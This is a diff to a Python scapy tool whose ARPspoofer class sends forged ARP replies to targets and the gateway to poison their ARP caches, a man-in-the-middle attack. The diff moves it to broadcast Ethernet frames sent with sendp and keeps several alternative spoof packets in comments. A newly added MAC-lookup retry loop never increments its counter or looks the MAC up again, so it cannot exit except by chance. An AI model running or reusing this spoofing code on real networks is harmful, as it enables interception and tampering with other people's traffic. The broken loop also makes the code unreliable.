@@ -27,8 +27,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 # DO NOT CHANGE THIS VALUES! USE CONFIG INSTEAD!
 DEFAULT_GATEWAY = '192.168.0.1'
 DEFAULT_NETWORK = "192.168.0.0/24"
-INTERVAL = 100
-CommandQueue = queue.Queue()
+INTERVAL = 20
 counter = 0
 
 
@@ -93,8 +92,13 @@ class ARPspoofer(threading.Thread):
         logger.debug('Targets: {}'.format(self.targets))
         for t in self.targets:
             mac = utils.arpping(t)
-            if mac is not None:
+            cc = 0
+            while mac is None:
                 logger.debug('Target {} has MAC: {}'.format(t, mac))
+                if cc > 3:
+                    logger.critical('Cannot determine MAC addr of {}'.format(t))
+                    break
+            if mac is not None:
                 self.ip_mac[t] = mac
 
     def __spoof(self):
@@ -105,20 +109,28 @@ class ARPspoofer(threading.Thread):
         :return: None
         """
         global counter
+        if counter == INTERVAL:
+            print(self.ip_mac.items())
         for ip, mac in self.ip_mac.items():
             if ip == self.gw:
                 continue
-            pkt = ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac)
+            # Ether(dst=V_MAC) / ARP(psrc=GW_IP, pdst=V_IP, hwdst=V_MAC)
+            # pkt = Ether(dst=mac) / ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac)
+            # send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
+            # send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
+            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac)
+            sendp(pkt, verbose=0)
             if counter == INTERVAL:
                 logger.debug('Sending ARP spoof message! Target: {}'.format(ip))
-                logger.debug('{}'.format(pkt.summary()))
-            send(pkt, verbose=0)
+                logger.debug('{}'.format(pkt.show(dump=True)))
 
-            pkt = ARP(op=2, pdst=self.gw, psrc=ip, hwdst=self.ip_mac[self.gw])
+            # p = Ether(dst=GW_MAC) / ARP(psrc=V_IP, pdst=GW_IP, hwdst=GW_MAC)
+            # pkt = Ether(dst=self.ip_mac[self.gw]) / ARP(op=2, pdst=self.gw, psrc=ip, hwdst=self.ip_mac[self.gw])
+            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=self.gw, psrc=ip, hwdst="ff:ff:ff:ff:ff:ff") #self.ip_mac[self.gw])
+            sendp(pkt, verbose=0)
             if counter == INTERVAL:
                 logger.debug('Sending ARP spoof message to GW with target: {}'.format(ip))
-                logger.debug('{}'.format(pkt.summary()))
-            send(pkt, verbose=0)
+                logger.debug('{}'.format(pkt.show(dump=True)))
 
     def __execute_cmd(self, cmd):
         """
